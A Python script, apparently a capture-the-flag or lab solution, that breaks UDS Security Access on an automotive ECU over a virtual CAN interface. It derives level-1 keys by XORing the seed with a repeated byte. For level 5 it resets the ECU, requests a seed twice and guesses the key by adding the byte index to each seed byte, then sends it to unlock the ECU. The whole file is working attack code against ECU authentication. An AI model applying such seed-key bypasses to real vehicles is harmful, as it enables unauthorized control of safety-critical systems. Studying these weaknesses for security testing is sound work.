import time
import isotp
from can_uds.comm import create_socket
from can_uds.uds import (
    SecurityAccess,
    reset_ecu,
)


def calc_key_level1(seed: bytes, xor_by: int) -> bytes:
    key = int.from_bytes(seed, "big") & 0xFFFFFFFF

    # 4バイト、全て xor_by で埋める
    xor = xor_by << 24 | xor_by << 16 | xor_by << 8 | xor_by

    key ^= xor
    return key.to_bytes(4, "big")


def solve_level1(sock: isotp.socket, xor_by: int):
    sec_access = SecurityAccess(sock, 0x01)
    seed = sec_access.request_seed()
    assert len(seed) == 4
    print(f"[level1] Seed: {seed.hex()}")

    key = calc_key_level1(seed, xor_by)
    print(f"[level1] Key: {key.hex()} (xor_by = {xor_by})")
    ret = sec_access.send_key(key)
    if ret:
        print(f"[level1] Security Access Level1 succeeded (xor_by = {xor_by})")
        return True


def guess_key_level5(sock: isotp.socket) -> bytes:
    # (1) ECU reset
    reset_ecu(sock)
    time.sleep(3.0)

    # (2) Security Access Level 5 を2回開始。2回目のseedを取得。
    sec_access = SecurityAccess(sock, 0x05)
    seed1 = sec_access.request_seed()
    print(f"[guess_key_level5] Seed1: {seed1.hex()}")
    seed2 = sec_access.request_seed()
    print(f"[guess_key_level5] Seed2: {seed2.hex()}")

    # (3) seed2について「上位から i バイト目 (i = 0~3) を +i したもの」を計算し、キーとする
    key = b"".join((seed2[i] + i).to_bytes(1, "big") for i in range(4))

    print(f"[guess_key_level5] Guessed Key: {key.hex()}")
    return key


def break_level5(key: bytes):
    # (1) ECU reset
    reset_ecu(sock)
    time.sleep(3.0)

    # (2) Security Access Level 5 を2回開始。
    sec_access = SecurityAccess(sock, 0x05)
    seed1 = sec_access.request_seed()
    print(f"[break_level5] Seed1: {seed1.hex()}")
    seed2 = sec_access.request_seed()
    print(f"[break_level5] Seed2: {seed2.hex()}")

    # (3) キーを送信
    if sec_access.send_key(key):
        print("[break_level5] Security Access Level5 succeeded")
    else:
        print("[break_level5] Security Access Level5 failed")


if __name__ == "__main__":
    sock = create_socket("vcan0", 0x7E0, 0x7E8)

    key = guess_key_level5(sock)

    break_level5(key)
